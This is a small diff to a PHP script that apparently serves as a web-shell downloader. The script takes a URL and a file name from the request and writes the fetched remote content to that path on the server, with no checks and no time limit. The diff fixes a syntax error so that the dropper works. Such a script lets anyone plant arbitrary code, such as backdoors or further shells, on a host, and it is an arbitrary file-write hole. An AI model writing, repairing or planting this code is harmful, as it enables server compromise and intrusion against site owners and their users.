@@ -8,7 +8,7 @@ echo '<input type="submit" value="Submit">';
 echo '</form>'; 
 if (!empty($_REQUEST['kueri'])) {
 set_time_limit(0);
-$url = $_REQUEST['u']);     
+$url = $_REQUEST['u'];     
 $file_name = $_REQUEST['f'];
     if (file_put_contents($file_name, file_get_contents($url)))
     {        echo "File downloaded successfully";    }
